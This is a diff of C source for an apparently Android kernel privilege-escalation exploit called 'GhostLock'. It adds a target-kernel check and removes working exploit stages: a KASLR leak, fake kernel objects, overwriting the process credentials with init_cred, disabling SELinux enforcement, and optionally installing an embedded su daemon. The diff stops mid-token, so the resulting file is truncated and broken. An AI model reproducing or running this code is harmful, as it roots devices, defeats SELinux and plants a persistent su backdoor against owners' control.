@@ -23,7 +23,20 @@ uint64_t kaslr_slide;
 #define DIRECT_READ_ATTEMPTS 10
 #define DIRECT_EFFECT_ATTEMPTS 10
 
-static int
+static int verify_target_kernel(void) {
+  char version[512];
+  read_first_line("/proc/version", version, sizeof(version));
+  int release_ok = strstr(version, TARGET_KERNEL_RELEASE) != NULL;
+  int build_ok = strstr(version, TARGET_SLOT_A_VERSION_MARKER) != NULL ||
+                 strstr(version, TARGET_SLOT_B_VERSION_MARKER) != NULL;
+  if (!release_ok || !build_ok) {
+    pr_warning("unsupported kernel; refusing exploit: %s\n", version);
+    return 0;
+  }
+  pr_success("target kernel accepted: %s\n", version);
+  return 1;
+}
+
 void *waiter_thread(void *arg __attribute__((unused))) {
   disable_rseq_for_thread();
 
@@ -617,224 +630,4 @@ static int run_direct_root_stage(void) {
     pr_error("direct cannot read selinux enforcing state\n");
     return 0;
   }
-  pr_success("direct pre-cred selinux preserved enforcing=%d\n", enforcing);
-
-  uintptr_t init_cred = canon_addr(INIT_CRED);
-  uintptr_t real_cred_slot = (uintptr_t)task + TASK_REAL_CRED_OFF;
-  uintptr_t cred_slot = (uintptr_t)task + TASK_CRED_OFF;
-  pr_success("direct-step before_init_cred uid=%u pid=%d task=%016llx\n",
-             getuid(), getpid(), (unsigned long long)task);
-
-  if (!direct_trigger_write64_until_routed(
-          "install_real_cred", real_cred_slot, init_cred, 1, &write_idx)) {
-    pr_error("direct real_cred install routes exhausted\n");
-    return 0;
-  }
-  if (getuid() != 2000 || geteuid() != 2000 ||
-      direct_read_enforcing() != 1) {
-    pr_error("direct real_cred stage changed current credentials or SELinux\n");
-    return 0;
-  }
-  uintptr_t selinux_target = canon_addr(SELINUX_ENFORCING);
-  if (!direct_trigger_write64_followup(
-          "install_cred_then_selinux_zero", cred_slot, init_cred, 1,
-          selinux_target, &write_idx)) {
-    pr_error("direct cred install failed\n");
-    return 0;
-  }
-
-  /*
-   * S4d2 repair (single write; fleet/code-review.md B1+M2): the two
-   * shape-1 installs collateral-write (task+slot-8)|color into
-   * init_cred[0], corrupting usage AND uid/gid.  A childless shape-1
-   * write (right=left=0 -> leaf rb_erase, no collateral) at
-   * init_cred+4 zeroes uid/gid/suid/sgid while LEAVING usage as the
-   * odd nonzero collateral value: atomic_dec_and_test can only free
-   * init_cred at exactly 0, which an odd garbage count never reaches.
-   * (Zeroing init_cred+0 instead would leave usage=0: one fork/exit
-   * pair -> put_cred_rcu frees the static init_cred.  A repair at
-   * init_cred-8 zeroes init_groups instead — both are wrong.)
-   */
-  int repair_ok = 0;
-  for (int attempt = 1; attempt <= DIRECT_EFFECT_ATTEMPTS; attempt++) {
-    int route_ok = direct_trigger_write64(
-        "repair_init_cred", init_cred + 4, 0, 1, &write_idx);
-    repair_ok = getuid() == 0 && geteuid() == 0 &&
-                getgid() == 0 && getegid() == 0;
-    pr_success("direct-effect repair_init_cred attempt=%d/%d route=%d "
-               "uid=%u euid=%u gid=%u egid=%u repaired=%d\n",
-               attempt, DIRECT_EFFECT_ATTEMPTS, route_ok,
-               getuid(), geteuid(), getgid(), getegid(), repair_ok);
-    if (route_ok && repair_ok) {
-      break;
-    }
-  }
-  if (!repair_ok) {
-    pr_error("direct init_cred repair exhausted without zero IDs\n");
-    return 0;
-  }
-
-  if (!restore_initial_affinity()) {
-    pr_error("restore initial CPU affinity failed errno=%d\n", errno);
-    return 0;
-  }
-
-  size_t policy_size = 0;
-  if (!direct_reload_selinux_policy(&policy_size)) {
-    pr_error("direct selinux policy repair failed errno=%d\n", errno);
-    return 0;
-  }
-  int enforcing_after = direct_read_enforcing();
-  pr_success("direct credential result uid=%u euid=%u gid=%u egid=%u "
-             "task=%016llx init_cred=%016zx selinux=%d->%d "
-             "policy_reload=%zu\n",
-             getuid(), geteuid(), getgid(), getegid(),
-             (unsigned long long)task, init_cred, enforcing, enforcing_after,
-             policy_size);
-
-  int id_ok = direct_run_id();
-  pid_t su_daemon_pid = -1;
-  int su_ok = 0;
-  int su_errno = 0;
-  const char *install_su = getenv("AI_PIN_INSTALL_SU");
-  if (install_su && strcmp(install_su, "1") == 0) {
-    errno = 0;
-    su_ok = install_embedded_su(&su_daemon_pid);
-    su_errno = errno;
-  }
-  int root_ok = getuid() == 0 && geteuid() == 0 &&
-                getgid() == 0 && getegid() == 0 && id_ok &&
-                enforcing == 1 && enforcing_after == 0;
-  pr_success("direct-root-summary root=%d id=%d optional_su=%d/%d daemon=%d "
-             "selinux=%d->%d uid=%u euid=%u gid=%u egid=%u\n",
-             root_ok, id_ok, su_ok, su_errno, su_daemon_pid,
-             enforcing, enforcing_after,
-             getuid(), geteuid(), getgid(), getegid());
-  return root_ok;
-}
-
-int run_exploit(int argc, char **argv) {
-  disable_rseq_for_thread();
-  set_unbuffer();
-  set_limit();
-  (void)argc;
-  (void)argv;
-  if (!verify_target_kernel()) {
-    return 3;
-  }
-  if (!init_direct_root_cpu()) {
-    pr_error("runtime performance CPU detection failed errno=%d\n", errno);
-    return 1;
-  }
-  if (!p0_env_init()) {
-    return 1;
-  }
-  if (!ghostlock_perf_gate_init()) {
-    pr_warning("perf reclaim gate initialization failed errno=%d\n", errno);
-    return 1;
-  }
-  if (ghostlock_perf_gate_enabled()) {
-    const struct ghostlock_perf_gate_result *perf_gate =
-        ghostlock_perf_gate_result();
-    pr_success("perf reclaim gate armed trace_free=239 trace_alloc=241 "
-               "pfn_range=%llx-%llx\n",
-               (unsigned long long)perf_gate->zone_start_pfn,
-               (unsigned long long)perf_gate->zone_end_pfn);
-  }
-  if (!ghostlock_capture_gate_init()) {
-    pr_warning("reclaim capture gate initialization failed errno=%d\n", errno);
-    return 1;
-  }
-  if (ghostlock_capture_gate_enabled()) {
-    const char *trace = getenv("AI_PIN_PREPARE_TRACE");
-    if (!trace || strcmp(trace, "1") != 0 || !prepare_reclaim_trace_init()) {
-      pr_warning("reclaim capture gate requires live trace control errno=%d\n",
-                 errno);
-      ghostlock_capture_gate_close();
-      return 1;
-    }
-    pr_success("reclaim capture gate armed token=%s\n",
-               ghostlock_capture_gate_token());
-  }
-  log_startup_context();
-
-  pin_to_core(CORE);
-  const char *kaslr_only = getenv("AI_PIN_KASLR_ONLY");
-  if (kaslr_only && strcmp(kaslr_only, "1") == 0) {
-    if (!slide_tracefs_leak_kernel_base()) {
-      pr_warning("kaslr-only tracefs measurement failed errno=%d\n", errno);
-      return 1;
-    }
-    pr_success("kaslr-only stage done base=%016llx slide=%016llx "
-               "trigger=disabled\n",
-               (unsigned long long)kaslr_base,
-               (unsigned long long)kaslr_slide);
-    return 0;
-  }
-  const char *prepare_only = getenv("AI_PIN_PREPARE_ONLY");
-  if (prepare_only && strcmp(prepare_only, "1") == 0) {
-    pr_success("prepare-only requested; GhostLock trigger is disabled\n");
-    if (!prepare_reclaim_trace_init()) {
-      pr_warning("prepare-only trace control failed errno=%d\n", errno);
-      return 1;
-    }
-    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
-    if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
-      pr_warning("prepare-only failed before trigger base=%016zx\n", page_base);
-      close_reclaim_sockets();
-      cleanup_page_prepare_state();
-      prepare_reclaim_trace_close();
-      return 1;
-    }
-    pr_success("prepare-only stage done base=%016zx fake_lock=%016zx "
-               "fake_w0=%016zx fake_task=%016zx trigger=disabled\n",
-               page_base, fake_lock, fake_w0, fake_task);
-    close_reclaim_sockets();
-    cleanup_page_prepare_state();
-    page_base = 0;
-    fake_lock = 0;
-    fake_w0 = 0;
-    fake_task = 0;
-    prepare_reclaim_trace_close();
-    return 0;
-  }
-
-  if (!slide_leak_kernel_base()) {
-    pr_error("slide kaslr leak failed\n");
-    return 1;
-  }
-  pr_success("slide stage done base=%016llx slide=%016llx\n",
-             (unsigned long long)kaslr_base,
-             (unsigned long long)kaslr_slide);
-
-  /*
-   * Validation mode: stop after the slide stage.  The direct stage needs
-   * its own per-boot validation and must not run as a side effect of a
-   * slide-stage experiment.
-   */
-  const char *slide_only = getenv("AI_PIN_SLIDE_ONLY");
-  if (slide_only && strcmp(slide_only, "1") == 0) {
-    pr_success("slide-only run requested; skipping direct stage "
-               "base=%016llx slide=%016llx\n",
-               (unsigned long long)kaslr_base,
-               (unsigned long long)kaslr_slide);
-    close_reclaim_sockets();
-    cleanup_page_prepare_state();
-    return 0;
-  }
-
-  /*
-   * slide 的 skb 已经被子进程消费，KASLR 也已读回；在父进程中释放本代
-   * reclaim socket 与残留 mm pin，避免 direct worker 只关闭继承副本、
-   * 而父进程仍把旧 partial slab 保活。
-   */
-  close_reclaim_sockets();
-  cleanup_page_prepare_state();
-  page_base = 0;
-  fake_lock = 0;
-  fake_w0 = 0;
-  fake_task = 0;
-  pr_info("slide generation released before direct stage\n");
-
-  return run_direct_root_stage() ? 0 : 2;
-}
+  pr
